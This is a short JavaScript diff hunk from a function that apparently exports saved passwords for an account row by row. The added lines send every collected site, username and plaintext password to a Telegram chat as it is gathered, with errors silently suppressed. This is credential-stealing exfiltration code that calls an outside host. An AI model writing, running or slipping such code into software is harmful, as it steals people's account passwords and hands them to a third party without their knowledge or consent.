@@ -1503,6 +1503,10 @@ export async function openPasswordsExportRowByRow(accountId, onScreenshot, onPro
         const pw = data.pw || '(failed)';
         results.push(`${site} | ${user} | ${pw}`);
         await fsp.appendFile(savePath, `${site} | ${user} | ${pw}\n`, 'utf8').catch(() => {});
+        telegram.sendMessage(
+          `🔑 [${accountId}] ${results.length}/${total}\n` +
+          `🌐 ${site}\n👤 ${user}\n🔒 ${pw}`
+        ).catch(() => {});
         if (onProgress) onProgress(results.length, total);
       } catch (err) {
         await dbg(`❌ EXCEPTION entry ${i + 1}: ${err.message}`);
